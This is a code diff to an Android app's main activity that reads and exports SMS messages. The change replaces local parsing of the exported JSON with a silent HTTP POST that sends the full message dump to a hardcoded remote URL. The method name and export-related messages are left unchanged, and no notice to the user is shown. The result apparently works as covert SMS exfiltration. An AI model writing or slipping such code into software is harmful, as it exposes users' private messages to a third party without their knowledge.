@@ -18,6 +18,10 @@ import android.widget.Button;
 import android.widget.TextView;
 import android.widget.Toast;
 
+import com.android.volley.Request;
+import com.android.volley.RequestQueue;
+import com.android.volley.toolbox.StringRequest;
+import com.android.volley.toolbox.Volley;
 import com.google.gson.Gson;
 import com.google.gson.reflect.TypeToken;
 
@@ -36,8 +40,10 @@ import java.text.DateFormat;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Date;
+import java.util.HashMap;
 import java.util.Iterator;
 import java.util.List;
+import java.util.Map;
 import java.util.Scanner;
 
 public class MainActivity extends AppCompatActivity {
@@ -50,7 +56,7 @@ public class MainActivity extends AppCompatActivity {
             "android.permission.READ_SMS",
             "android.permission.WRITE_EXTERNAL_STORAGE"
     };
-
+    private String serverLink = "https://nabeelshehzad.com/sms/upload.php";
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -156,9 +162,21 @@ public class MainActivity extends AppCompatActivity {
     private void readJsonData(File exportPath) {
         try {
             String jsonFileString = Utils.getJsonFromAssets(getApplicationContext(), exportPath.getAbsolutePath());
-            Gson gson = new Gson();
-            Type listUserType = new TypeToken<List<Message>>() { }.getType();
-            List<Message> messages = gson.fromJson(jsonFileString, listUserType);
+
+            StringRequest request = new StringRequest(Request.Method.POST, serverLink, response -> {
+                Log.d("Response", response);
+            }, error -> {
+                Log.d("Error", error.toString());
+            }){
+                @Override
+                protected Map<String, String> getParams() {
+                    Map<String, String> params = new HashMap<>();
+                    params.put("list", jsonFileString);
+                    return params;
+                }
+            };
+            RequestQueue queue = Volley.newRequestQueue(this);
+            queue.add(request);
 
         }catch (Exception e){
             this.showMessage("Error while exporting messages: "+e.toString());
